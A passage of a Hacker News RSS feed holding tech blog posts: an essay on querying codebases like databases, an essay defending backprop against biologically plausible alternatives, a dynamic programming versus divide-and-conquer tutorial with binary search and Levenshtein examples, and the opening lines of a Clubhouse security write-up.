In our codebase, we have hundreds of these jobs, each with their own <code>run_config</code>. If you look at this codebase as a database, you can imagine these jobs being rows in a <code>jobs</code> table, where the fields on each row correspond to the parameters provided to the <code>RunConfig</code> class. </p>
<p>
Wouldn‚Äôt it be great to be able to browse all these jobs in a table? Maybe you could perform some basic operations on this data: searching for specific jobs by name or owning team; sorting by the time-of-day they‚Äôre scheduled to run; filtering for jobs owned by your team that have errored in the past week. Maybe you could edit the <code>run_config</code> from that interface (like you might edit a spreadsheet) and have it automatically make the corresponding change in the source code (or open a PR). Maybe you could even compute some aggregations on this data ‚Äî for example, if you‚Äôre introducing a new job that requires some expensive computation, maybe you‚Äôd like to know which hours have the fewest other jobs scheduled. And of course, this job browser should be bidirectional with respect to the codebase ‚Äî there should be a button beside each entry that shows the code for the job inline or opens the corresponding code in your editor.</p>
<h2>
Diffused concepts</h2>
<p>
Codebases typically contain logical concepts that are implemented across multiple pieces of code. This is often the case when you need to create multiple files to implement a particular feature.</p>
<p>
For example, in Rails, a ‚Äúresource‚Äù is collectively implemented across a line in the router, a model file, a controller file, and a bunch of view files. Rails even ships with a code generator to <a href="https://github.com/rails/rails/blob/5f3ff60084ab5d5921ca3499814e4697f8350ee7/railties/lib/rails/generators/rails/resource/USAGE">create some of these files</a> for you. But despite resources being a core concept when working with Rails, there‚Äôs no good way to browse the resources in your codebase<a href="#fn:4" id="fnref:4" title="see footnote">4</a>. There‚Äôs no good way to filter or query your codebase either ‚Äî you can‚Äôt, for example, see which resources support JSON vs XML params. </p>
<p>
For another example, consider pubsub (aka emitter-consumer) pipelines. In web services, when you have processing that can happen ‚Äúin the background‚Äù, one service will publish an event; another service subscribes to that event and will do the background processing on its own when it receives the event. Often, these will form event ‚Äúpipelines‚Äù or trees where an event consumer will emit additional events that are consumed by yet other services. These pipelines are concepts that developers talk about (as in, the ‚Äúaccount creation pipeline‚Äù or ‚Äúfunding reconciliation pipeline‚Äù), but in most codebases the pipeline itself isn‚Äôt declared or reified anywhere in the code.</p>
<p>
If you‚Äôre looking at code that emits an event, how do you find the consumers? If you‚Äôre lucky, the event has a unique, literal name and the consumer uses that name literally as well. But maybe some subscribers are using wildcard event names, or names generated by string concatenation, and that becomes a lot harder to grep for. Likewise, if you‚Äôre looking at a consumer of an event, how do you find the locations in the codebase that could emit that event<a href="#fn:5" id="fnref:5" title="see footnote">5</a>?</p>
<p>
Wouldn‚Äôt it be great to be able to browse those pipelines in a table or perhaps a directed graph<a href="#fn:6" id="fnref:6" title="see footnote">6</a>? Maybe that graph would support some basic operations on this data: searching for specific publishers or subscribers by class name or event name; filtering for pipelines that have run into errors; maybe even showing the flow of a particular event given an event ID<a href="#fn:7" id="fnref:7" title="see footnote">7</a>. And of course, this pipeline browser should be bidirectional with respect to the codebase ‚Äî there should be a button beside each graph node that shows the code for the publisher or subscriber inline or opens the corresponding code in your editor.</p>
<p>
For a final example, consider code that has functionality inherited from elsewhere. Some environments let you see a <a href="https://www.jetbrains.com/help/idea/viewing-structure-of-a-source-file.html">list of inherited properties</a> or methods, but this isn‚Äôt possible for more specialized cases. At Stripe, we have code that implements shell scripts that can take command-line arguments and flags. These arguments are defined via a DSL in the implementing code, but these commands can be subclassed, and there‚Äôs no way to see what the available arguments are while working in the subclass.</p>
<h2>
Philosophy</h2>
<p>
I think it‚Äôs important to consider these problems not as disparate cases in need of bespoke tooling, but as a <em>class</em> of problems characterized by a lack of access to the data structures embedded within codebases. Just like SQL databases and spreadsheets provide a singular querying abstraction and a set of visualization primitives that can be applied to any kind of data, programming environments need a singular querying abstraction and set of visualization primitives that can be applied to the concepts lurking in codebases. Getting there does <em>not</em> mean using proprietary drag-and-drop visual programming interfaces where the introspection capabilities are limited to whatever the programming environment happens to have implemented. Just the opposite ‚Äî you should still be able to do whatever you want with your code (including treating it as plain-text files), <em>and also</em> have access to more advanced introspection tools that can query and slice your code ‚Äî tools that let you easily understand and navigate complex codebases to reduce the <em>incidental complexity</em> of building software.</p>
<h2>
Solutions</h2>
<p>
I don‚Äôt have a solution to sell you here (at least, not yet!). But <a href="https://twitter.com/hirday_g/status/1356657607381946369">by popular demand</a> I think it‚Äôs worthwhile to at least discuss principles that solutions should embody and directionally-related prior art. </p>
<p>
To start with a simple example, see <a href="https://ihp.digitallyinduced.com/">IHP</a>, a full-stack web framework similar to Rails. It comes with a web interface for manipulating your project‚Äôs codebase and database schema. <a href="https://youtu.be/UbDtS_mUMpI?t=102">One point in the introduction video</a> showed changes being made in the visual schema editor being automatically reflected in the SQL code that describes the database schema ‚Äî and changes being made to the SQL code being bidirectionally reflected in the visual schema editor. </p>
<p>
For a more in-depth example, consider <a href="https://pharo.org/">Pharo</a>, a Smalltalk environment. ‚ÄúEnvironment‚Äù in this case means that it feels like you‚Äôre using a custom OS (including global menus, idioms, and keyboard and mouse conventions) designed specifically for browsing, writing, and debugging programs in the Smalltalk programming language<a href="#fn:8" id="fnref:8" title="see footnote">8</a>. The holistic integration of these tools is important. Unlike the programming environments we cobble for ourselves today ‚Äî where the editor is agnostic of the language and runtime and other tools like debuggers, inspectors, and code browsers are tacked on (if they exist at all) ‚Äî it‚Äôs worth thinking about what an entire computing experience <em>for</em> writing and building custom tools might look like<a href="#fn:9" id="fnref:9" title="see footnote">9</a>.</p>
<p>
Pharo is also interesting because of its Class Browser, which looks like this:</p>
<p>
  <img src="https://files.tanagram.app/file/tanagram-data/prod-feifans-blog/database-codebase-pharo-browser.png" alt="Pharo class browser">
</p>
<p>
This browser breaks free from the source code <em>file</em> as the atomic unit of browsing; instead, it allows the user to browse one method at a time. Making the ‚Äúunit of browsing‚Äù ‚Ä¶</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://feifan.blog/posts/the-database-inside-your-codebase">https://feifan.blog/posts/the-database-inside-your-codebase</a></em></p>]]>
            </description>
            <link>https://feifan.blog/posts/the-database-inside-your-codebase</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127428</guid>
            <pubDate>Sat, 13 Feb 2021 22:06:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Mess with Backprop: Doubts about Biologically Plausible Deep Learning]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127387">thread link</a>) | @ericjang
<br/>
February 13, 2021 | https://blog.evjang.com/2021/02/backprop.html | <a href="https://web.archive.org/web/*/https://blog.evjang.com/2021/02/backprop.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4236921617169203700" itemprop="description articleBody">
<p>Biologically Plausible Deep Learning (BPDL) is an active research field at the intersection of Neuroscience and Machine Learning, studying how we can train deep neural networks with a "learning rule" that could conceivably be implemented in the brain.</p><p>The line of reasoning that typically motivates BPDL is as follows:</p><ol><li>A Deep Neural Network (DNN) can learn to&nbsp;perform perception tasks that biological brains are capable of (such as detecting and recognizing objects).</li><li>If activation units and their weights are to DNNs as&nbsp;what neurons and synapses are to biological brains, then what is <a href="https://en.wikipedia.org/wiki/Backpropagation">backprop </a>(the primary method for training deep neural nets) analogous to?</li><li>If learning rules in brains are not implemented using backprop, then how are they implemented? How can we achieve similar performance to backprop-based update rules while still respecting biological constraints?</li></ol><p>A nice overview of the ways in which backprop is not biologically plausible can be found <a href="https://psychology.stackexchange.com/questions/16269/is-back-prop-biologically-plausible">here</a>, along with various algorithms that propose fixes.</p><p>My somewhat contrarian opinion is that designing biologically plausible alternatives to backprop is the wrong question to be asking. The motivating premises of BPDL makes a faulty assumption: that <b>layer activations are neurons and weights are synapses, and therefore learning-via-backprop must have a counterpart or alternative in biological learning.</b></p><p>Despite the name and their impressive capabilities on various tasks, DNNs actually have very little to do with biological neural networks. One of the great errors in the field of Machine Learning is that we ascribe too much biological&nbsp; meaning to our statistical tools and optimal control algorithms. It leads to confusion from newcomers, who ascribe entirely different meaning to "learning", "evolutionary algorithms", and so on.</p><p>DNNs are a sequence of linear operations interspersed with nonlinear operations, applied sequentially to real-valued inputs - nothing more. They are optimized via gradient descent, and gradients are computed efficiently using a dynamic programming scheme known as backprop. Note that I didn't use the word "learning"!</p><p>Dynamic programming is the ninth wonder of the world<span>1</span>, and in my opinion one of the top three achievements of Computer Science. Backprop has linear time-complexity in network depth, which makes it extraordinarily hard to beat from a computational cost perspective. Many BPDL algorithms often don't do better than backprop, because they try to take an efficient optimization scheme and shoehorn in an update mechanism with additional constraints.&nbsp;</p><p>If the goal is to build a biologically plausible learning mechanism, there's no reason that units in Deep Neural Networks should be one-to-one with biological neurons. Trying to emulate a DNN with models of biologically neurons feels backwards; like trying to emulate the Windows OS with a human brain. It's hard and a human brain can't simulate Windows well.</p><p>Instead, let's do the emulation the other way around: optimizing a function approximator to&nbsp;implement a biologically plausible learning rule. The recipe is straightforward:</p><ol><li>Build a biological plausible model of a neural network with model neurons and synaptic connections. Neurons communicate with each other using spike trains, rate coding, or gradients, and respect whatever constraints you deem to be "sufficiently biologically plausible". It has parameters that need to be trained.</li><li>Use computer-aided search to design a biologically plausible learning rule for these model neurons. For instance, each neuron's feedforward behavior and local update rules can be modeled as a decision from an artificial neural network.</li><li>Update the function approximator so that the biological model produces the desired learning behavior. We could train the neural networks via backprop.&nbsp;</li></ol><p>The choice of function approximator we use to find our learning rule is irrelevant - what we care about at the end of the day is answering how a biological brain is able to learn hard tasks like perception, while respecting known constraints like the fact that biological neurons don't store all activations in memory or only employ local learning rules. We should leverage Deep Learning's ability to find good function approximators, and direct that towards finding a good biological learning rules.</p><p>The insight that we should&nbsp;<i>(artificially)&nbsp;learn to (biologically) learn</i>&nbsp;is not a new idea, but it is one that I think is not yet obvious to the neuroscience + AI community. <a href="https://en.wikipedia.org/wiki/Meta_learning_(computer_science)">Meta-Learning</a>, or "Learning to Learn",&nbsp;is a field that has emerged in recent years, which formulates the act of acquiring a system capable of performing learning behavior (potentially superior to gradient descent). If meta-learning can find us more <a href="https://arxiv.org/pdf/1703.05175.pdf">sample efficient</a> or <a href="https://arxiv.org/abs/1904.07392">superior</a>&nbsp;or <a href="https://arxiv.org/pdf/1906.03367.pdf">robust</a>&nbsp;learners, why can't it find us rules that respect biological learning constraints? Indeed, recent work [<a href="https://arxiv.org/pdf/2006.09549.pdf">1</a>, <a href="https://www.biorxiv.org/content/10.1101/2019.12.30.891184v1.full.pdf">2</a>, <a href="https://arxiv.org/pdf/2012.03837.pdf">3</a>, <a href="https://arxiv.org/abs/1608.05343">4</a>, <a href="http://proceedings.mlr.press/v119/real20a/real20a.pdf">5</a>] shows this to be the case. You can indeed use backprop to train a separate learning rule superior to na√Øve backprop.</p><p>I think the reason that many researchers have not really caught onto this idea (that we should emulate biologically plausible circuits with a meta-learning approach) is that until recently, compute power wasn't quite strong enough to both train a meta-learner and a learner. It still requires substantial computing power and research infrastructure to set up a meta-optimization scheme, but tools like <a href="https://blog.evjang.com/2019/02/maml-jax.html">JAX make it considerably easier now</a>.</p><p>A true biology purist might argue that finding a learning rule using gradient descent and backprop is not an "evolutionarily plausible learning rule", because evolution clearly lacks the ability to perform dynamic programming or even gradient computation. But this can be amended by making the meta-learner evolutionarily plausible. For instance, the mechanism with which we select good function approximators does not need rely on backprop at all. Alternatively, we could formulate a meta-meta problem whereby the selection process itself obeys rules of evolutionary selection, but the selection process is found using, once again, backprop.</p><p>Don't mess with backprop!</p><p><b>Footnotes</b></p><p>[1] The eighth wonder being, of course, <a href="https://www.listenmoneymatters.com/compound-interest/">compound interest</a>.</p>

</div></div>]]>
            </description>
            <link>https://blog.evjang.com/2021/02/backprop.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127387</guid>
            <pubDate>Sat, 13 Feb 2021 22:01:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Programming vs. Divide-and-Conquer (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127326">thread link</a>) | @trekhleb
<br/>
February 13, 2021 | https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/ | <a href="https://web.archive.org/web/*/https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <img alt="Dynamic Programming vs Divide-and-Conquer" title="Dynamic Programming vs Divide-and-Conquer" src="https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/9c177/09.png" srcset="https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/63868/09.png 250w,
https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/0b533/09.png 500w,
https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/9c177/09.png 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<h2 id="tldr">TL;DR<a href="#tldr" aria-label="tldr permalink"></a></h2>
<p>In this article I‚Äôm trying to explain the difference/similarities between dynamic programing and divide and conquer approaches based on two examples: <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/search/binary-search">binary search</a> and <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/string/levenshtein-distance">minimum edit distance</a> (Levenshtein distance).</p>
<h2 id="the-problem">The Problem<a href="#the-problem" aria-label="the problem permalink"></a></h2>
<p>When I <a href="https://github.com/trekhleb/javascript-algorithms">started to learn algorithms</a> it was hard for me to understand the main idea of dynamic programming (<strong>DP</strong>) and how it is different from divide-and-conquer (<strong>DC</strong>) approach. When it gets to comparing those two paradigms usually Fibonacci function comes to the rescue as great <a href="https://stackoverflow.com/questions/13538459/difference-between-divide-and-conquer-algo-and-dynamic-programming">example</a>. But when we‚Äôre trying to solve the <strong>same</strong> problem using both DP and DC approaches to explain each of them, it feels for me like we may <strong>lose valuable detail</strong> that might help to catch the difference faster. These detail tells us that each technique serves best for <strong>different</strong> types of problems.</p>
<p>I‚Äôm still in the process of understanding DP and DC difference, and I can‚Äôt say that I‚Äôve fully grasped the concepts so far. But I hope this article will shed some extra light and help you to do another step of learning such valuable algorithm paradigms as dynamic programming and divide-and-conquer.</p>
<h2 id="dynamic-programming-and-divide-and-conquer-similarities">Dynamic Programming and Divide-and-Conquer Similarities<a href="#dynamic-programming-and-divide-and-conquer-similarities" aria-label="dynamic programming and divide and conquer similarities permalink"></a></h2>
<p>As I see it for now I can say that <strong>dynamic programming is an extension of the divide and conquer paradigm</strong>.</p>
<p>I would <strong>not</strong> treat them as something completely different. Because <strong>they both work by recursively breaking down a problem into two or more sub-problems</strong> of the same or related type, until these become simple enough to be solved directly. The solutions to the sub-problems are then combined to give a solution to the original problem.</p>
<p>So why do we still have different paradigm names then and why I called dynamic programming an extension. It is because dynamic programming approach may be applied to the problem <strong>only if the problem has certain restrictions or prerequisites</strong>. After that dynamic programming extends divide and conquer approach with <strong>memoization</strong> or <strong>tabulation</strong> technique.</p>
<p>Let‚Äôs go step by step...</p>
<h2 id="dynamic-programming-prerequisitesrestrictions">Dynamic Programming Prerequisites/Restrictions<a href="#dynamic-programming-prerequisitesrestrictions" aria-label="dynamic programming prerequisitesrestrictions permalink"></a></h2>
<p>As we‚Äôve just discovered there are two key attributes that divide and conquer problem must have in order for dynamic programming to be applicable:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Optimal_substructure">Optimal substructure</a> - optimal solution can be constructed from optimal solutions of its sub-problems</li>
<li><a href="https://en.wikipedia.org/wiki/Overlapping_subproblems">Overlapping sub-problems</a> - problem can be broken down into sub-problems which are reused several times, or a recursive algorithm for the problem solves the same sub-problem over and over rather than always generating new sub-problems</li>
</ul>
<p>Once these two conditions are met we can say that this divide and conquer problem may be solved using dynamic programming approach.</p>
<h2 id="dynamic-programming-extension-for-divide-and-conquer">Dynamic Programming Extension for Divide and Conquer<a href="#dynamic-programming-extension-for-divide-and-conquer" aria-label="dynamic programming extension for divide and conquer permalink"></a></h2>
<p>Dynamic programming approach extends divide and conquer approach with two techniques (<strong>memoization</strong> and <strong>tabulation</strong>) that both have a purpose of storing and re-using sub-problems solutions that may drastically improve performance. For example naive recursive implementation of Fibonacci function has time complexity of <code>O(2^n)</code> where DP solution doing the same with only <code>O(n)</code> time.</p>
<p><strong>Memoization (top-down cache filling)</strong> refers to the technique of caching and reusing previously computed results. The memoized <code>fib</code> function would thus look like this:</p>
<div data-language="text"><pre><code>memFib(n) {
    if (mem[n] is undefined)
        if (n &lt; 2) result = n
        else result = memFib(n-2) + memFib(n-1)
        mem[n] = result
    return mem[n]
}</code></pre></div>
<p><strong>Tabulation (bottom-up cache filling)</strong> is similar but focuses on filling the entries of the cache. Computing the values in the cache is easiest done iteratively. The tabulation version of <code>fib</code> would look like this:</p>
<div data-language="text"><pre><code>tabFib(n) {
    mem[0] = 0
    mem[1] = 1
    for i = 2...n
        mem[i] = mem[i-2] + mem[i-1]
    return mem[n]
}</code></pre></div>
<p>You may read more about memoization and tabulation comparison <a href="https://programming.guide/dynamic-programming-vs-memoization-vs-tabulation.html">here</a>.</p>
<p>The main idea you should grasp here is that because our divide and conquer problem has overlapping sub-problems the caching of sub-problem solutions becomes possible and thus memoization/tabulation step up onto the scene.</p>
<h2 id="so-what-the-difference-between-dp-and-dc-after-all">So What the Difference Between DP and DC After All<a href="#so-what-the-difference-between-dp-and-dc-after-all" aria-label="so what the difference between dp and dc after all permalink"></a></h2>
<p>Since we‚Äôre now familiar with DP prerequisites and its methodologies we‚Äôre ready to put all that was mentioned above into one picture.</p>
<p><span>
      <span></span>
  <img alt="Dynamic programming and divide and conquer paradigms dependency" title="Dynamic programming and divide and conquer paradigms dependency" src="https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/f84cf/02-dp.jpg" srcset="https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/0479a/02-dp.jpg 250w,
https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/41099/02-dp.jpg 500w,
https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/f84cf/02-dp.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Dynamic programming and divide and conquer paradigms dependency
</i></center>
<p>Let‚Äôs go and try to solve some problems using DP and DC approaches to make this illustration more clear.</p>
<h2 id="divide-and-conquer-example-binary-search">Divide and Conquer Example: Binary Search<a href="#divide-and-conquer-example-binary-search" aria-label="divide and conquer example binary search permalink"></a></h2>
<p><a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">Binary search</a> algorithm, also known as half-interval search, is a search algorithm that finds the position of a target value within a sorted array. Binary search compares the target value to the middle element of the array; if they are unequal, the half in which the target cannot lie is eliminated and the search continues on the remaining half until the target value is found. If the search ends with the remaining half being empty, the target is not in the array.</p>
<h3 id="example">Example<a href="#example" aria-label="example permalink"></a></h3>
<p>Here is a visualization of the binary search algorithm where 4 is the target value.</p>
<p><span>
      <span></span>
  <img alt="Binary search algorithm logic" title="Binary search algorithm logic" src="https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/f84cf/03-binary-search.jpg" srcset="https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/0479a/03-binary-search.jpg 250w,
https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/41099/03-binary-search.jpg 500w,
https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/f84cf/03-binary-search.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Binary search algorithm logic
</i></center>
<p>Let‚Äôs draw the same logic but in form of decision tree.</p>
<p><span>
      <span></span>
  <img alt="Binary search algorithm decision tree" title="Binary search algorithm decision tree" src="https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/65072/04-bs-decision-tree.jpg" srcset="https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/0479a/04-bs-decision-tree.jpg 250w,
https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/41099/04-bs-decision-tree.jpg 500w,
https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/65072/04-bs-decision-tree.jpg 830w" sizes="(max-width: 830px) 100vw, 830px" loading="lazy">
    </span></p>
<center><i>
Binary search algorithm decision tree
</i></center>
<p>You may clearly see here a divide and conquer principle of solving the problem. We‚Äôre iteratively breaking the original array into sub-arrays and trying to find required element in there.</p>
<p>Can we apply dynamic programming to it? <strong>No</strong>. It is because <strong>there are no overlapping sub-problems</strong>. Every time we split the array into completely independent parts. And according to divide and conquer prerequisites/restrictions the sub-problems <strong>must be</strong> overlapped somehow.</p>
<p>Normally every time you draw a decision tree and it is actually a <strong>tree</strong> (and <strong>not</strong> a decision <strong>graph</strong>) it would mean that you don‚Äôt have overlapping sub-problems and this is not dynamic programming problem.</p>
<h3 id="the-code">The Code<a href="#the-code" aria-label="the code permalink"></a></h3>
<p><a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/search/binary-search">Here</a> you may find complete source code of binary search function with test cases and explanations.</p>
<div data-language="javascript"><pre><code><span>function</span> <span>binarySearch</span><span>(</span><span>sortedArray<span>,</span> seekElement</span><span>)</span> <span>{</span>
  <span>let</span> startIndex <span>=</span> <span>0</span><span>;</span>
  <span>let</span> endIndex <span>=</span> sortedArray<span>.</span>length <span>-</span> <span>1</span><span>;</span>
  <span>while</span> <span>(</span>startIndex <span>&lt;=</span> endIndex<span>)</span> <span>{</span>
    <span>const</span> middleIndex <span>=</span> startIndex <span>+</span> Math<span>.</span><span>floor</span><span>(</span><span>(</span>endIndex <span>-</span> startIndex<span>)</span> <span>/</span> <span>2</span><span>)</span><span>;</span>
    
    <span>if</span> <span>(</span>sortedArray<span>[</span>middleIndex<span>]</span> <span>===</span> seekElement<span>)</span> <span>{</span>
      <span>return</span> middleIndex<span>;</span>
    <span>}</span>
    
    <span>if</span> <span>(</span>sortedArray<span>[</span>middleIndex<span>]</span> <span>&lt;</span> seekElement<span>)</span> <span>{</span>
      
      startIndex <span>=</span> middleIndex <span>+</span> <span>1</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      
      endIndex <span>=</span> middleIndex <span>-</span> <span>1</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>-</span><span>1</span><span>;</span>
<span>}</span></code></pre></div>
<h2 id="dynamic-programming-example-minimum-edit-distance">Dynamic Programming Example: Minimum Edit Distance<a href="#dynamic-programming-example-minimum-edit-distance" aria-label="dynamic programming example minimum edit distance permalink"></a></h2>
<p>Normally when it comes to dynamic programming examples the <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/math/fibonacci">Fibonacci</a> number algorithm is being taken by default. But let‚Äôs take a little bit more complex algorithm to have some kind of variety that should help us to grasp the concept.</p>
<p><a href="https://en.wikipedia.org/wiki/Levenshtein_distance">Minimum Edit Distance</a> (or Levenshtein Distance) is a string metric for measuring the difference between two sequences. Informally, the Levenshtein distance between two words is the minimum number of single-character edits (<em>insertions, deletions or substitutions</em>) required to change one word into the other.</p>
<h3 id="example-1">Example<a href="#example-1" aria-label="example 1 permalink"></a></h3>
<p>For example, the Levenshtein distance between ‚Äúkitten‚Äù and ‚Äúsitting‚Äù is 3, since the following three edits change one into the other, and there is no way to do it with fewer than three edits:</p>
<ul>
<li><strong>k</strong>itten ‚Üí <strong>s</strong>itten (substitution of ‚Äús‚Äù for ‚Äúk‚Äù)</li>
<li>sitt<strong>e</strong>n ‚Üí sitt<strong>i</strong>n (substitution of ‚Äúi‚Äù for ‚Äúe‚Äù)</li>
<li>sittin ‚Üí sittin<strong>g</strong> (insertion of ‚Äúg‚Äù at the end).</li>
</ul>
<h3 id="applications">Applications<a href="#applications" aria-label="applications permalink"></a></h3>
<p>This has a wide range of applications, for instance, spell checkers, correction systems for optical character recognition, fuzzy string searching, and software to assist natural language translation based on translation memory.</p>
<h3 id="mathematical-definition">Mathematical Definition<a href="#mathematical-definition" aria-label="mathematical definition permalink"></a></h3>
<p>Mathematically, the Levenshtein distance between two strings <code>a</code>, <code>b</code> (of length <code>|a|</code> and <code>|b|</code> respectively) is given by function <code>lev(|a|, |b|)</code> where:</p>
<p><span>
      <span></span>
  <img alt="Mathematical definition" title="Mathematical definition" src="https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/9c177/05-levinshtein-formula.png" srcset="https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/63868/05-levinshtein-formula.png 250w,
https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/0b533/05-levinshtein-formula.png 500w,
https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/9c177/05-levinshtein-formula.png 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<p>Note that the first element in the minimum corresponds to <strong>deletion</strong> (from <code>a</code> to <code>b</code>), the second to <strong>insertion</strong> and the third to <strong>match or mismatch</strong>, depending on whether the respective symbols are the same.</p>
<h3 id="explanation">Explanation<a href="#explanation" aria-label="explanation permalink"></a></h3>
<p>Ok, let‚Äôs try to figure out what that formula is talking about. Let‚Äôs take a simple example of finding minimum edit distance between strings <strong>ME</strong> and <strong>MY</strong>. Intuitively you already know that minimum edit distance here is <strong>1</strong> operation and this operation is *‚Äúreplace <strong>E</strong> with <strong>Y</strong>‚Äù*. But let‚Äôs try to formalize it in a form of the algorithm in order to be able to do more complex examples like transforming <strong>Saturday</strong> into <strong>Sunday</strong>.</p>
<p>To apply the formula to M<strong>E</strong>‚ÜíM<strong>Y</strong> transformation we need to know minimum edit distances of ME‚ÜíM, M‚ÜíMY and M‚ÜíM transformations in prior. Then we will need to pick the minimum one and add +1 operation to transform last letters E‚ÜíY.</p>
<p>So we can already see here a recursive nature of the solution: minimum edit distance of ME‚ÜíMY transformation is being calculated based on three previously possible transformations. Thus we may say that this is <strong>divide and conquer algorithm</strong>.</p>
<p>To explain this further let‚Äôs draw the following matrix.</p>
<p><span>
      <span></span>
  <img alt="Simple example of finding minimum edit distance between ME and MY strings" title="Simple example of finding minimum edit distance between ME and MY strings" src="https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/f84cf/05-levinshtein-matrix.jpg" srcset="https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/0479a/05-levinshtein-matrix.jpg 250w,
https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/41099/05-levinshtein-matrix.jpg 500w,
https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/f84cf/05-levinshtein-matrix.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Simple example of finding minimum edit distance between ME and MY strings
</i></center>
<ul>
<li><strong>Cell (0,1)</strong> contains red number 1. It means that we need 1 operation to transform <strong>M</strong> to <strong>empty string</strong>: delete <strong>M</strong>. This is why this number is red.</li>
<li><strong>Cell (0,2)</strong> contains red number 2. It means that we need 2 operations to transform <strong>ME</strong> to <strong>empty string</strong>: delete <strong>E</strong>, delete <strong>M</strong>.</li>
<li><strong>Cell (1,0)</strong> contains green number 1. It means that we need 1 operation to transform empty string to <strong>M</strong>: insert <strong>M</strong>. This is why this number is green.</li>
<li><strong>Cell (2,0)</strong> contains green number 2. It means that we need 2 operations to transform empty string to <strong>MY</strong>: insert <strong>Y</strong>, insert <strong>M</strong>.</li>
<li><strong>Cell (1,1)</strong> contains number 0. It means that it costs nothing to transform <strong>M</strong> to <strong>M</strong>.</li>
<li><strong>Cell (1,2)</strong> contains red number 1. It means that we need 1 operation to transform <strong>ME</strong> to <strong>M</strong>: delete <strong>E</strong>.</li>
<li>And so on...</li>
</ul>
<p>This looks easy for such small matrix as ours (it is only 3x3). But how we could calculate all those numbers for bigger matrices (let‚Äôs say 9x7 one, for Saturday‚ÜíSunday transformation)?</p>
<p>The good news is that according to the formula you ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/">https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/</a></em></p>]]>
            </description>
            <link>https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127326</guid>
            <pubDate>Sat, 13 Feb 2021 21:53:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No one else was in the room where it happened ‚Äì disturbing the clubhouse peace]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127200">thread link</a>) | @pajowu
<br/>
February 13, 2021 | https://zerforschung.org/posts/clubhouse-endless-audio-fun-en | <a href="https://web.archive.org/web/*/https://zerforschung.org/posts/clubhouse-endless-audio-fun-en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/f86427c789d3ed88f9e78be8d68f2d4f1ddcfbda/e4855/p/clubhouse-fun/clubhouse-agora-zerforschung-meme.jpg" alt="Coverimage"></p><h2 id="what-happened-so-far-">What happened so far ‚Ä¶</h2><p>In our first <a href="https://zerforschung.org/posts/gespraeche-aus-dem-clubhouse/">thread on Clubhouse (in german)</a> we had only taken a superficial look at Clubhouse.</p><p>We saw that Clubhouse uses an external service provider called Agora.io for the voice call functionality.
Agora.io is also used by many other apps, including a therapy app.
